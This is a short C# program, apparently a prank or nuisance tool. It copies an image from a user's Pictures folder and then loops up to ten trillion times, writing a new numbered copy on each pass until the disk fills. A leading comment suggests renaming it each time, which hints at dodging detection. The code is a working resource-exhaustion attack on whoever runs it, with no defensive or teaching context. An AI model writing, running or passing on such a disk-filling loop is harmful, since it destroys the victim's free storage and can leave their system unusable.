// TODO: Resort the name and change it every time, the code works very well by now

namespace MainPoint
{
    // Class to store global variables
    class Global
    {
        public static string sourceFile = @"C:\Users\glitc\Pictures\Pinterest\kj.jpg";
        public static string destinationFile = @"C:\Users\glitc\Pictures\reyna.png";
        
    }
    class Program 
    {
        public static void Main(string[] args)
        {
            Copy();
        }

        public static void Copy() // Method for copying and pasting the file infinitely
        {
            File.Copy(Global.sourceFile, Global.destinationFile, true); // true allows overwriting
            for (long i = 0; i < 10000000000000; i++)
            {
                Global.destinationFile = @"C:\Users\glitc\Pictures\reyna" + i + ".png";
                File.Copy(Global.sourceFile, Global.destinationFile);
            }


        }

        public static Boolean Check()
        {
            if (File.Exists(Global.destinationFile))
            {
                return true;
            }

            else
            {
                return false;
            }
        }
    }
}